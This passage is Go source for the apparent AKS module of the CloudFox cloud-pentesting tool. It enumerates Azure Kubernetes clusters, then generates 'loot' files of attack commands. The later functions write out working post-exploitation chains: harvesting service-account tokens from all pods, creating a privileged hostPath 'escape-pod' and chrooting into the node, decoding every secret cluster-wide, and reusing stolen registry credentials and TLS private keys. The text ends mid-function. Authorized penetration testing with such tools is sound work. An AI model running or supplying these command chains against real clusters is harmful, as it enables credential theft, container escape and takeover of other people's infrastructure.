package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/containerservice/armcontainerservice"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	azinternal "github.com/BishopFox/cloudfox/internal/azure"
	"github.com/BishopFox/cloudfox/internal/azure/sdk"
	"github.com/spf13/cobra"
)

// ------------------------------
// Cobra command
// ------------------------------
var AzAksCommand = &cobra.Command{
	Use:     "aks",
	Aliases: []string{"aksclusters"},
	Short:   "Enumerate Azure Kubernetes Service (AKS) clusters",
	Long: `
Enumerate AKS clusters for a specific tenant:
  ./cloudfox az aks --tenant TENANT_ID

Enumerate AKS clusters for a specific subscription:
  ./cloudfox az aks --subscription SUBSCRIPTION_ID`,
	Run: ListAks,
}

// ------------------------------
// Module struct (AWS pattern)
// ------------------------------
type AksModule struct {
	azinternal.BaseAzureModule // Embed common fields (15 fields)

	// Module-specific fields
	Subscriptions []string
	Clusters      []AksCluster
	mu            sync.Mutex
}

type AksCluster struct {
	TenantName       string // NEW: for multi-tenant support
	TenantID         string // NEW: for multi-tenant support
	SubscriptionID   string
	SubscriptionName string
	ResourceGroup    string
	Region           string
	ClusterName      string
	K8sVersion       string
	DNSPrefix        string
	ClusterURL       string
	PublicCluster    string
	EntraIDAuth      string
	SystemAssignedID string
	UserAssignedID   string
}

// ------------------------------
// Output struct
// ------------------------------
type AksOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o AksOutput) TableFiles() []internal.TableFile { return o.Table }
func (o AksOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Cobra command entry point (thin wrapper)
// ------------------------------
func ListAks(cmd *cobra.Command, args []string) {
	// -------------------- Use InitializeCommandContext helper --------------------
	cmdCtx, err := azinternal.InitializeCommandContext(cmd, globals.AZ_AKS_MODULE_NAME)
	if err != nil {
		return // error already logged by helper
	}
	defer cmdCtx.Session.StopMonitoring()

	// -------------------- Initialize module --------------------
	module := &AksModule{
		BaseAzureModule: azinternal.NewBaseAzureModule(cmdCtx, 5),
		Subscriptions:   cmdCtx.Subscriptions,
		Clusters:        []AksCluster{},
	}

	// -------------------- Execute module --------------------
	module.PrintAks(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Main module method (AWS-style)
// ------------------------------
func (m *AksModule) PrintAks(ctx context.Context, logger internal.Logger) {
	// Multi-tenant processing
	if m.IsMultiTenant {
		logger.InfoM(fmt.Sprintf("Multi-tenant mode: Processing %d tenants", len(m.Tenants)), globals.AZ_AKS_MODULE_NAME)

		// Process each tenant independently
		for _, tenantCtx := range m.Tenants {
			// Temporarily set module tenant context for row creation
			savedTenantID := m.TenantID
			savedTenantName := m.TenantName
			savedTenantInfo := m.TenantInfo

			m.TenantID = tenantCtx.TenantID
			m.TenantName = tenantCtx.TenantName
			m.TenantInfo = tenantCtx.TenantInfo

			if m.Verbosity >= globals.AZ_VERBOSE_ERRORS {
				logger.InfoM(fmt.Sprintf("Processing tenant: %s (%s)", m.TenantName, m.TenantID), globals.AZ_AKS_MODULE_NAME)
			}

			// Process subscriptions for this tenant
			m.RunSubscriptionEnumeration(ctx, logger, tenantCtx.Subscriptions,
				globals.AZ_AKS_MODULE_NAME, m.processSubscription)

			// Restore tenant context
			m.TenantID = savedTenantID
			m.TenantName = savedTenantName
			m.TenantInfo = savedTenantInfo
		}
	} else {
		// Single tenant processing (existing logic)
		m.RunSubscriptionEnumeration(ctx, logger, m.Subscriptions, globals.AZ_AKS_MODULE_NAME, m.processSubscription)
	}

	// Generate and write output
	m.writeOutput(ctx, logger)
}

// ------------------------------
// Process single subscription
// ------------------------------
func (m *AksModule) processSubscription(ctx context.Context, subID string, logger internal.Logger) {
	// Get subscription name
	subName := azinternal.GetSubscriptionNameFromID(ctx, m.Session, subID)

	// Get resource groups (CACHED)
	resourceGroups := m.ResolveResourceGroups(subID)

	// Process resource groups concurrently for better performance
	var rgWg sync.WaitGroup
	rgSemaphore := make(chan struct{}, 10) // Limit to 10 concurrent RGs

	for _, rgName := range resourceGroups {
		rgWg.Add(1)
		go m.processResourceGroup(ctx, subID, subName, rgName, &rgWg, rgSemaphore, logger)
	}

	rgWg.Wait()
}

// ------------------------------
// Process single resource group (extracted for RG-level concurrency)
// ------------------------------
func (m *AksModule) processResourceGroup(ctx context.Context, subID, subName, rgName string, wg *sync.WaitGroup, semaphore chan struct{}, logger internal.Logger) {
	defer wg.Done()

	// Acquire semaphore
	semaphore <- struct{}{}
	defer func() { <-semaphore }()

	// Get AKS clusters (CACHED)
	clusters, err := sdk.CachedGetAKSClustersPerResourceGroup(ctx, m.Session, subID, rgName)
	if err != nil {
		// AWS-style error handling: log and count, but continue
		logger.ErrorM(fmt.Sprintf("Failed to get clusters in RG %s: %v", rgName, err), globals.AZ_AKS_MODULE_NAME)
		m.CommandCounter.Error++
		return
	}

	// Process each cluster
	for _, cluster := range clusters {
		m.addCluster(ctx, cluster, subID, subName, rgName)
	}
}

// ------------------------------
// Add cluster to collection
// ------------------------------
func (m *AksModule) addCluster(ctx context.Context, cluster *armcontainerservice.ManagedCluster, subID, subName, rgName string) {
	clusterName := azinternal.GetAKSClusterName(cluster)
	k8sVersion := azinternal.GetAKSKubernetesVersion(cluster)

	// Extract managed identities
	systemAssignedID := "N/A"
	userAssignedID := "N/A"

	if cluster.Identity != nil {
		// System Assigned Identity ID
		if cluster.Identity.PrincipalID != nil {
			systemAssignedID = *cluster.Identity.PrincipalID
		}

		// User Assigned Identity IDs
		if cluster.Identity.UserAssignedIdentities != nil && len(cluster.Identity.UserAssignedIdentities) > 0 {
			var userAssignedIDs []string
			for uaID := range cluster.Identity.UserAssignedIdentities {
				userAssignedIDs = append(userAssignedIDs, azinternal.ExtractResourceName(uaID))
			}
			if len(userAssignedIDs) > 0 {
				userAssignedID = strings.Join(userAssignedIDs, "\n")
			}
		}
	}
	publicIP, privateFQDN := azinternal.GetAKSClusterFQDNs(cluster)

	publicCluster := "Yes"
	clusterURL := publicIP
	if privateFQDN != "N/A" {
		publicCluster = "No"
	}

	// Check for EntraID Centralized Auth (Azure AD authentication for AKS)
	entraIDAuth := "Disabled"
	if cluster.Properties != nil && cluster.Properties.AADProfile != nil {
		// Check if managed AAD is enabled OR Azure RBAC for K8s authorization is enabled
		if (cluster.Properties.AADProfile.Managed != nil && *cluster.Properties.AADProfile.Managed) ||
			(cluster.Properties.AADProfile.EnableAzureRBAC != nil && *cluster.Properties.AADProfile.EnableAzureRBAC) {
			entraIDAuth = "Enabled"
		}
	}

	aksCluster := AksCluster{
		TenantName:       m.TenantName, // NEW: Always populated for multi-tenant support
		TenantID:         m.TenantID,   // NEW: Always populated for multi-tenant support
		SubscriptionID:   subID,
		SubscriptionName: subName,
		ResourceGroup:    rgName,
		Region:           azinternal.GetAKSClusterLocation(cluster),
		ClusterName:      clusterName,
		K8sVersion:       k8sVersion,
		DNSPrefix:        azinternal.SafeStringPtr(cluster.Properties.DNSPrefix),
		ClusterURL:       clusterURL,
		PublicCluster:    publicCluster,
		EntraIDAuth:      entraIDAuth,
		SystemAssignedID: systemAssignedID,
		UserAssignedID:   userAssignedID,
	}

	// Thread-safe append
	m.mu.Lock()
	m.Clusters = append(m.Clusters, aksCluster)
	m.mu.Unlock()
}

// ------------------------------
// Write output (AWS-style writeLoot pattern)
// ------------------------------
func (m *AksModule) writeOutput(ctx context.Context, logger internal.Logger) {
	if len(m.Clusters) == 0 {
		logger.InfoM("No AKS clusters found", globals.AZ_AKS_MODULE_NAME)
		return
	}

	// Build table rows
	var tableRows [][]string
	for _, cluster := range m.Clusters {
		tableRows = append(tableRows, []string{
			cluster.TenantName, // NEW: for multi-tenant support
			cluster.TenantID,   // NEW: for multi-tenant support
			cluster.SubscriptionID,
			cluster.SubscriptionName,
			cluster.ResourceGroup,
			cluster.Region,
			cluster.ClusterName,
			cluster.K8sVersion,
			cluster.DNSPrefix,
			cluster.ClusterURL,
			cluster.PublicCluster,
			cluster.EntraIDAuth,
			cluster.SystemAssignedID,
			cluster.UserAssignedID,
		})
	}

	// Build headers
	header := []string{
		"Tenant Name", // NEW: for multi-tenant support
		"Tenant ID",   // NEW: for multi-tenant support
		"Subscription ID",
		"Subscription Name",
		"Resource Group",
		"Region",
		"Cluster Name",
		"Kubernetes Version",
		"DNS Prefix",
		"Cluster URL",
		"Public?",
		"EntraID Centralized Auth",
		"System Assigned Identity ID",
		"User Assigned Identity ID",
	}

	// Check if we should split output by tenant (multi-tenant mode)
	if azinternal.ShouldSplitByTenant(m.IsMultiTenant, m.Tenants) {
		if err := m.FilterAndWritePerTenantAuto(
			ctx,
			logger,
			m.Tenants,
			tableRows,
			header,
			"aks",
			globals.AZ_AKS_MODULE_NAME,
		); err != nil {
			return
		}
		return
	}

	// Check if we should split output by subscription (multiple subs WITHOUT --tenant flag, single tenant)
	if azinternal.ShouldSplitBySubscription(m.Subscriptions, m.TenantFlagPresent) {
		if err := m.FilterAndWritePerSubscriptionAuto(
			ctx, logger, m.Subscriptions, tableRows, header,
			"aks", globals.AZ_AKS_MODULE_NAME,
		); err != nil {
			return
		}
		return
	}

	// Build loot content
	lootContent := m.generateLoot()
	podExecLootContent := m.generatePodExecLoot()
	secretDumpingLootContent := m.generateSecretDumpingLoot()

	// Create output
	output := AksOutput{
		Table: []internal.TableFile{
			{
				Name:   "aks",
				Header: header,
				Body:   tableRows,
			},
		},
		Loot: []internal.LootFile{
			{Name: "aks-commands", Contents: lootContent},
			{Name: "aks-pod-exec-commands", Contents: podExecLootContent},
			{Name: "aks-secrets-commands", Contents: secretDumpingLootContent},
		},
	}

	// Determine output scope (single subscription vs tenant-wide consolidation)
	scopeType, scopeIDs, scopeNames := azinternal.DetermineScopeForOutput(m.Subscriptions, m.TenantID, m.TenantName, m.TenantFlagPresent)
	scopeNames = azinternal.GetSubscriptionNamesForOutput(ctx, m.Session, scopeType, scopeIDs)

	// Write output using HandleOutputSmart (automatic streaming for large datasets)
	if err := internal.HandleOutputSmart(
		"Azure",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		scopeType,
		scopeIDs,
		scopeNames,
		m.UserUPN,
		output,
	); err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), globals.AZ_AKS_MODULE_NAME)
		m.CommandCounter.Error++
	}

	logger.SuccessM(fmt.Sprintf("Found %d AKS cluster(s) across %d subscription(s)", len(m.Clusters), len(m.Subscriptions)), globals.AZ_AKS_MODULE_NAME)
}

// ------------------------------
// Generate loot commands
// ------------------------------
func (m *AksModule) generateLoot() string {
	var loot string

	for _, cluster := range m.Clusters {
		loot += fmt.Sprintf(
			"## AKS Cluster: %s\n"+
				"# Set subscription context\n"+
				"az account set --subscription %s\n"+
				"\n"+
				"# Show cluster details\n"+
				"az aks show --name %s --resource-group %s\n"+
				"\n"+
				"# Get cluster credentials (adds to ~/.kube/config)\n"+
				"az aks get-credentials --resource-group %s --name %s\n"+
				"\n"+
				"## PowerShell equivalent\n"+
				"Set-AzContext -SubscriptionId %s\n"+
				"Get-AzAksCluster -Name %s -ResourceGroupName %s\n"+
				"# Note: Use az aks get-credentials for kubeconfig - no PowerShell equivalent\n\n",
			cluster.ClusterName,
			cluster.SubscriptionID,
			cluster.ClusterName, cluster.ResourceGroup,
			cluster.ResourceGroup, cluster.ClusterName,
			cluster.SubscriptionID,
			cluster.ClusterName, cluster.ResourceGroup,
		)
	}

	return loot
}

// ------------------------------
// Generate pod execution and secret dumping commands
// ------------------------------
func (m *AksModule) generatePodExecLoot() string {
	var loot string

	loot += "# AKS Pod Execution & Secret Dumping Commands\n"
	loot += "# NOTE: These commands require cluster credentials obtained via 'az aks get-credentials'\n"
	loot += "# WARNING: Executing commands in pods and accessing secrets can be detected by cluster monitoring.\n\n"

	for _, cluster := range m.Clusters {
		loot += fmt.Sprintf("## AKS Cluster: %s (Subscription: %s, RG: %s)\n", cluster.ClusterName, cluster.SubscriptionID, cluster.ResourceGroup)
		loot += fmt.Sprintf("# Step 0: Get cluster credentials first\n")
		loot += fmt.Sprintf("az account set --subscription %s\n", cluster.SubscriptionID)
		loot += fmt.Sprintf("az aks get-credentials --resource-group %s --name %s\n\n", cluster.ResourceGroup, cluster.ClusterName)

		// List pods
		loot += fmt.Sprintf("# Step 1: List all pods across all namespaces\n")
		loot += fmt.Sprintf("kubectl get pods --all-namespaces -o wide\n\n")

		loot += fmt.Sprintf("# List pods with more details (including node, IP)\n")
		loot += fmt.Sprintf("kubectl get pods -A -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,NODE:.spec.nodeName,IP:.status.podIP,STATUS:.status.phase\n\n")

		// List privileged pods
		loot += fmt.Sprintf("# Find privileged pods (potential escape paths)\n")
		loot += fmt.Sprintf("kubectl get pods --all-namespaces -o json | jq -r '.items[] | select(.spec.containers[].securityContext.privileged == true) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'\n\n")

		// Execute commands in pods
		loot += fmt.Sprintf("# Step 2: Execute commands in a pod\n")
		loot += fmt.Sprintf("# List pods in a namespace\n")
		loot += fmt.Sprintf("kubectl get pods -n <NAMESPACE>\n\n")

		loot += fmt.Sprintf("# Get interactive shell in pod\n")
		loot += fmt.Sprintf("kubectl exec -it <POD-NAME> -n <NAMESPACE> -- /bin/bash\n")
		loot += fmt.Sprintf("# Or try sh if bash is not available\n")
		loot += fmt.Sprintf("kubectl exec -it <POD-NAME> -n <NAMESPACE> -- /bin/sh\n\n")

		loot += fmt.Sprintf("# Execute single command in pod\n")
		loot += fmt.Sprintf("kubectl exec <POD-NAME> -n <NAMESPACE> -- whoami\n")
		loot += fmt.Sprintf("kubectl exec <POD-NAME> -n <NAMESPACE> -- id\n")
		loot += fmt.Sprintf("kubectl exec <POD-NAME> -n <NAMESPACE> -- hostname\n")
		loot += fmt.Sprintf("kubectl exec <POD-NAME> -n <NAMESPACE> -- env\n\n")

		// Service account tokens
		loot += fmt.Sprintf("# Step 3: Extract service account tokens from pods\n")
		loot += fmt.Sprintf("# Service account tokens provide authentication to the Kubernetes API\n")
		loot += fmt.Sprintf("kubectl exec <POD-NAME> -n <NAMESPACE> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token\n\n")

		loot += fmt.Sprintf("# Save token to variable\n")
		loot += fmt.Sprintf("SA_TOKEN=$(kubectl exec <POD-NAME> -n <NAMESPACE> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)\n")
		loot += fmt.Sprintf("echo \"Service Account Token: $SA_TOKEN\"\n\n")

		loot += fmt.Sprintf("# Get service account CA certificate\n")
		loot += fmt.Sprintf("kubectl exec <POD-NAME> -n <NAMESPACE> -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt > ca.crt\n\n")

		loot += fmt.Sprintf("# Get namespace\n")
		loot += fmt.Sprintf("SA_NAMESPACE=$(kubectl exec <POD-NAME> -n <NAMESPACE> -- cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)\n\n")

		// Use stolen token
		loot += fmt.Sprintf("# Step 4: Use stolen service account token to access Kubernetes API\n")
		loot += fmt.Sprintf("APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')\n")
		loot += fmt.Sprintf("curl -k -H \"Authorization: Bearer $SA_TOKEN\" \"$APISERVER/api/v1/namespaces/$SA_NAMESPACE/pods\"\n\n")

		// Port forwarding
		loot += fmt.Sprintf("# Step 5: Port forward to services (access internal services)\n")
		loot += fmt.Sprintf("# List services\n")
		loot += fmt.Sprintf("kubectl get services --all-namespaces\n\n")

		loot += fmt.Sprintf("# Port forward to a service\n")
		loot += fmt.Sprintf("kubectl port-forward -n <NAMESPACE> svc/<SERVICE-NAME> 8080:80\n")
		loot += fmt.Sprintf("# Then access: http://localhost:8080\n\n")

		loot += fmt.Sprintf("# Port forward to a pod directly\n")
		loot += fmt.Sprintf("kubectl port-forward -n <NAMESPACE> <POD-NAME> 8080:80\n\n")

		// Access Kubernetes dashboard
		loot += fmt.Sprintf("# Step 6: Access Kubernetes Dashboard (if deployed)\n")
		loot += fmt.Sprintf("# Check if dashboard is deployed\n")
		loot += fmt.Sprintf("kubectl get pods -n kubernetes-dashboard\n\n")

		loot += fmt.Sprintf("# Port forward to dashboard\n")
		loot += fmt.Sprintf("kubectl port-forward -n kubernetes-dashboard svc/kubernetes-dashboard 8443:443\n")
		loot += fmt.Sprintf("# Access: https://localhost:8443\n\n")

		// List all resources
		loot += fmt.Sprintf("# Step 7: Enumerate cluster resources\n")
		loot += fmt.Sprintf("# List all resource types\n")
		loot += fmt.Sprintf("kubectl api-resources\n\n")

		loot += fmt.Sprintf("# List nodes\n")
		loot += fmt.Sprintf("kubectl get nodes -o wide\n\n")

		loot += fmt.Sprintf("# List all deployments\n")
		loot += fmt.Sprintf("kubectl get deployments --all-namespaces\n\n")

		loot += fmt.Sprintf("# List all services\n")
		loot += fmt.Sprintf("kubectl get services --all-namespaces\n\n")

		loot += fmt.Sprintf("# List all config maps (may contain sensitive data)\n")
		loot += fmt.Sprintf("kubectl get configmaps --all-namespaces\n\n")

		loot += fmt.Sprintf("# Get specific configmap\n")
		loot += fmt.Sprintf("kubectl get configmap <CONFIGMAP-NAME> -n <NAMESPACE> -o yaml\n\n")

		// Check permissions
		loot += fmt.Sprintf("# Step 8: Check your permissions in the cluster\n")
		loot += fmt.Sprintf("kubectl auth can-i --list\n\n")

		loot += fmt.Sprintf("# Check if you can create pods (privilege escalation)\n")
		loot += fmt.Sprintf("kubectl auth can-i create pods\n")
		loot += fmt.Sprintf("kubectl auth can-i create pods --all-namespaces\n\n")

		loot += fmt.Sprintf("# Check if you can get secrets\n")
		loot += fmt.Sprintf("kubectl auth can-i get secrets\n")
		loot += fmt.Sprintf("kubectl auth can-i get secrets --all-namespaces\n\n")

		// Container escape
		loot += fmt.Sprintf("# Step 9: Container escape techniques (if pod is privileged)\n")
		loot += fmt.Sprintf("# Check if pod is privileged\n")
		loot += fmt.Sprintf("kubectl get pod <POD-NAME> -n <NAMESPACE> -o jsonpath='{.spec.containers[*].securityContext.privileged}'\n\n")

		loot += fmt.Sprintf("# If privileged, you may be able to access host filesystem\n")
		loot += fmt.Sprintf("# From inside pod:\n")
		loot += fmt.Sprintf("# nsenter --target 1 --mount --uts --ipc --net /bin/bash\n\n")

		// Get logs
		loot += fmt.Sprintf("# Step 10: Get pod logs (may contain sensitive data)\n")
		loot += fmt.Sprintf("kubectl logs <POD-NAME> -n <NAMESPACE>\n")
		loot += fmt.Sprintf("kubectl logs <POD-NAME> -n <NAMESPACE> --previous  # Previous container logs\n")
		loot += fmt.Sprintf("kubectl logs <POD-NAME> -n <NAMESPACE> -c <CONTAINER-NAME>  # Specific container\n\n")

		// ENHANCED: Multi-step realistic exploitation scenarios
		loot += fmt.Sprintf("# ========================================\n")
		loot += fmt.Sprintf("# ENHANCED EXPLOITATION SCENARIOS\n")
		loot += fmt.Sprintf("# ========================================\n\n")

		loot += fmt.Sprintf("# SCENARIO 1: Automated Privilege Escalation Chain\n")
		loot += fmt.Sprintf("# Complete workflow: enumerate pods → steal SA tokens → test permissions\n\n")
		loot += fmt.Sprintf("APISERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')\n")
		loot += fmt.Sprintf("echo \"Testing service account tokens from all running pods...\"\n")
		loot += fmt.Sprintf("for NS in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do\n")
		loot += fmt.Sprintf("  PODS=$(kubectl get pods -n $NS --field-selector=status.phase=Running -o jsonpath='{.items[*].metadata.name}')\n")
		loot += fmt.Sprintf("  for POD in $PODS; do\n")
		loot += fmt.Sprintf("    TOKEN=$(kubectl exec $POD -n $NS -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)\n")
		loot += fmt.Sprintf("    [ -z \"$TOKEN\" ] && continue\n")
		loot += fmt.Sprintf("    # Test if token can list secrets (high-value target)\n")
		loot += fmt.Sprintf("    SECRETS=$(curl -sk -H \"Authorization: Bearer $TOKEN\" \"$APISERVER/api/v1/namespaces/$NS/secrets\" 2>/dev/null)\n")
		loot += fmt.Sprintf("    echo $SECRETS | grep -q '\"kind\":\"SecretList\"' && echo \"✓ $NS/$POD token can list secrets!\"\n")
		loot += fmt.Sprintf("  done\n")
		loot += fmt.Sprintf("done\n\n")

		loot += fmt.Sprintf("# SCENARIO 2: Container Escape via Privileged Pod Creation\n")
		loot += fmt.Sprintf("# If you can create pods, this creates a privileged pod with host access\n\n")
		loot += fmt.Sprintf("cat <<'PODEOF' | kubectl apply -f -\n")
		loot += fmt.Sprintf("apiVersion: v1\n")
		loot += fmt.Sprintf("kind: Pod\n")
		loot += fmt.Sprintf("metadata:\n")
		loot += fmt.Sprintf("  name: escape-pod\n")
		loot += fmt.Sprintf("spec:\n")
		loot += fmt.Sprintf("  hostNetwork: true\n")
		loot += fmt.Sprintf("  hostPID: true\n")
		loot += fmt.Sprintf("  containers:\n")
		loot += fmt.Sprintf("  - name: escape\n")
		loot += fmt.Sprintf("    image: ubuntu:latest\n")
		loot += fmt.Sprintf("    command: [\"/bin/sleep\", \"3600\"]\n")
		loot += fmt.Sprintf("    securityContext:\n")
		loot += fmt.Sprintf("      privileged: true\n")
		loot += fmt.Sprintf("    volumeMounts:\n")
		loot += fmt.Sprintf("    - mountPath: /host\n")
		loot += fmt.Sprintf("      name: hostroot\n")
		loot += fmt.Sprintf("  volumes:\n")
		loot += fmt.Sprintf("  - name: hostroot\n")
		loot += fmt.Sprintf("    hostPath:\n")
		loot += fmt.Sprintf("      path: /\n")
		loot += fmt.Sprintf("PODEOF\n\n")
		loot += fmt.Sprintf("sleep 5 && kubectl exec -it escape-pod -- chroot /host bash\n\n")

		loot += fmt.Sprintf("---\n\n")
	}

	return loot
}

// ------------------------------
// Generate Kubernetes secret dumping commands
// ------------------------------
func (m *AksModule) generateSecretDumpingLoot() string {
	var loot string

	loot += "# Kubernetes Secret Dumping Commands\n"
	loot += "# NOTE: These commands require cluster credentials obtained via 'az aks get-credentials'\n"
	loot += "# WARNING: Secrets contain highly sensitive data including passwords, API keys, certificates, and registry credentials.\n\n"

	for _, cluster := range m.Clusters {
		loot += fmt.Sprintf("## AKS Cluster: %s (Subscription: %s, RG: %s)\n", cluster.ClusterName, cluster.SubscriptionID, cluster.ResourceGroup)
		loot += fmt.Sprintf("# Step 0: Get cluster credentials first\n")
		loot += fmt.Sprintf("az account set --subscription %s\n", cluster.SubscriptionID)
		loot += fmt.Sprintf("az aks get-credentials --resource-group %s --name %s\n\n", cluster.ResourceGroup, cluster.ClusterName)

		// List all secrets
		loot += fmt.Sprintf("# Step 1: List all secrets across all namespaces\n")
		loot += fmt.Sprintf("kubectl get secrets --all-namespaces\n\n")

		loot += fmt.Sprintf("# List secrets with type information\n")
		loot += fmt.Sprintf("kubectl get secrets -A -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.type,DATA:.data\n\n")

		// List secrets by type
		loot += fmt.Sprintf("# List secrets by type\n")
		loot += fmt.Sprintf("# Opaque secrets (generic secrets)\n")
		loot += fmt.Sprintf("kubectl get secrets --all-namespaces --field-selector type=Opaque\n\n")

		loot += fmt.Sprintf("# Service account tokens\n")
		loot += fmt.Sprintf("kubectl get secrets --all-namespaces --field-selector type=kubernetes.io/service-account-token\n\n")

		loot += fmt.Sprintf("# Docker registry credentials (image pull secrets)\n")
		loot += fmt.Sprintf("kubectl get secrets --all-namespaces --field-selector type=kubernetes.io/dockerconfigjson\n\n")

		loot += fmt.Sprintf("# TLS certificates\n")
		loot += fmt.Sprintf("kubectl get secrets --all-namespaces --field-selector type=kubernetes.io/tls\n\n")

		loot += fmt.Sprintf("# Basic auth credentials\n")
		loot += fmt.Sprintf("kubectl get secrets --all-namespaces --field-selector type=kubernetes.io/basic-auth\n\n")

		// Dump specific secret
		loot += fmt.Sprintf("# Step 2: Dump a specific secret (with base64 decoding)\n")
		loot += fmt.Sprintf("# Get secret in YAML format\n")
		loot += fmt.Sprintf("kubectl get secret <SECRET-NAME> -n <NAMESPACE> -o yaml\n\n")

		loot += fmt.Sprintf("# Get secret data as JSON\n")
		loot += fmt.Sprintf("kubectl get secret <SECRET-NAME> -n <NAMESPACE> -o json | jq '.data'\n\n")

		loot += fmt.Sprintf("# Dump and decode all secret values\n")
		loot += fmt.Sprintf("kubectl get secret <SECRET-NAME> -n <NAMESPACE> -o jsonpath='{.data}' | jq -r 'to_entries[] | \"\\(.key): \\(.value | @base64d)\"'\n\n")

		loot += fmt.Sprintf("# Decode a specific key from a secret\n")
		loot += fmt.Sprintf("kubectl get secret <SECRET-NAME> -n <NAMESPACE> -o jsonpath='{.data.<KEY-NAME>}' | base64 -d\n\n")

		// Dump all secrets
		loot += fmt.Sprintf("# Step 3: Dump ALL secrets from a namespace (decoded)\n")
		loot += fmt.Sprintf("NAMESPACE=\"<NAMESPACE>\"\n")
		loot += fmt.Sprintf("for SECRET in $(kubectl get secrets -n $NAMESPACE -o jsonpath='{.items[*].metadata.name}'); do\n")
		loot += fmt.Sprintf("  echo \"Secret: $SECRET\"\n")
		loot += fmt.Sprintf("  kubectl get secret $SECRET -n $NAMESPACE -o jsonpath='{.data}' | jq -r 'to_entries[] | \"  \\(.key): \\(.value | @base64d)\"'\n")
		loot += fmt.Sprintf("  echo \"\"\n")
		loot += fmt.Sprintf("done\n\n")

		// Dump all secrets from all namespaces
		loot += fmt.Sprintf("# Step 4: Dump ALL secrets from ALL namespaces (decoded)\n")
		loot += fmt.Sprintf("for NAMESPACE in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'); do\n")
		loot += fmt.Sprintf("  echo \"Namespace: $NAMESPACE\"\n")
		loot += fmt.Sprintf("  for SECRET in $(kubectl get secrets -n $NAMESPACE -o jsonpath='{.items[*].metadata.name}'); do\n")
		loot += fmt.Sprintf("    echo \"  Secret: $SECRET\"\n")
		loot += fmt.Sprintf("    kubectl get secret $SECRET -n $NAMESPACE -o jsonpath='{.data}' | jq -r 'to_entries[] | \"    \\(.key): \\(.value | @base64d)\"' 2>/dev/null\n")
		loot += fmt.Sprintf("  done\n")
		loot += fmt.Sprintf("done\n\n")

		// Extract image pull secrets
		loot += fmt.Sprintf("# Step 5: Extract Docker registry credentials (imagePullSecrets)\n")
		loot += fmt.Sprintf("# List all image pull secrets\n")
		loot += fmt.Sprintf("kubectl get secrets --all-namespaces --field-selector type=kubernetes.io/dockerconfigjson -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name\n\n")

		loot += fmt.Sprintf("# Decode a specific image pull secret\n")
		loot += fmt.Sprintf("kubectl get secret <REGISTRY-SECRET-NAME> -n <NAMESPACE> -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d | jq\n\n")

		loot += fmt.Sprintf("# Extract registry credentials\n")
		loot += fmt.Sprintf("REGISTRY_SECRET=$(kubectl get secret <REGISTRY-SECRET-NAME> -n <NAMESPACE> -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d)\n")
		loot += fmt.Sprintf("echo \"$REGISTRY_SECRET\" | jq -r '.auths | to_entries[] | \"Registry: \\(.key)\\nUsername: \\(.value.username)\\nPassword: \\(.value.password)\\nAuth: \\(.value.auth | @base64d)\\n\"'\n\n")

		// Use stolen registry credentials
		loot += fmt.Sprintf("# Step 6: Use stolen registry credentials\n")
		loot += fmt.Sprintf("# Extract registry URL, username, and password\n")
		loot += fmt.Sprintf("REGISTRY=$(kubectl get secret <REGISTRY-SECRET-NAME> -n <NAMESPACE> -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d | jq -r '.auths | keys[0]')\n")
		loot += fmt.Sprintf("USERNAME=$(kubectl get secret <REGISTRY-SECRET-NAME> -n <NAMESPACE> -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d | jq -r '.auths[].username')\n")
		loot += fmt.Sprintf("PASSWORD=$(kubectl get secret <REGISTRY-SECRET-NAME> -n <NAMESPACE> -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d | jq -r '.auths[].password')\n\n")

		loot += fmt.Sprintf("# Login to container registry\n")
		loot += fmt.Sprintf("echo \"$PASSWORD\" | docker login $REGISTRY -u $USERNAME --password-stdin\n\n")

		loot += fmt.Sprintf("# Or for Azure Container Registry\n")
		loot += fmt.Sprintf("az acr login --name <ACR-NAME> --username $USERNAME --password $PASSWORD\n\n")

		loot += fmt.Sprintf("# List images in registry (if ACR)\n")
		loot += fmt.Sprintf("az acr repository list --name <ACR-NAME> --username $USERNAME --password $PASSWORD\n\n")

		loot += fmt.Sprintf("# Pull image from registry\n")
		loot += fmt.Sprintf("docker pull $REGISTRY/<IMAGE-NAME>:<TAG>\n\n")

		// TLS certificates
		loot += fmt.Sprintf("# Step 7: Extract TLS certificates and keys\n")
		loot += fmt.Sprintf("# List TLS secrets\n")
		loot += fmt.Sprintf("kubectl get secrets --all-namespaces --field-selector type=kubernetes.io/tls\n\n")

		loot += fmt.Sprintf("# Extract TLS certificate\n")
		loot += fmt.Sprintf("kubectl get secret <TLS-SECRET-NAME> -n <NAMESPACE> -o jsonpath='{.data.tls\\.crt}' | base64 -d > tls.crt\n\n")

		loot += fmt.Sprintf("# Extract TLS private key\n")
		loot += fmt.Sprintf("kubectl get secret <TLS-SECRET-NAME> -n <NAMESPACE> -o jsonpath='{.data.tls\\.key}' | base64 -d > tls.key\n\n")

		loot += fmt.Sprintf("# View certificate details\n")
		loot += fmt.Sprintf("openssl x509 -in tls.crt -text -noout\n\n")

		// ConfigMaps (not secrets but may contain sensitive data)
		loot += fmt.Sprintf("# Step 8: Dump ConfigMaps (may contain sensitive data)\n")
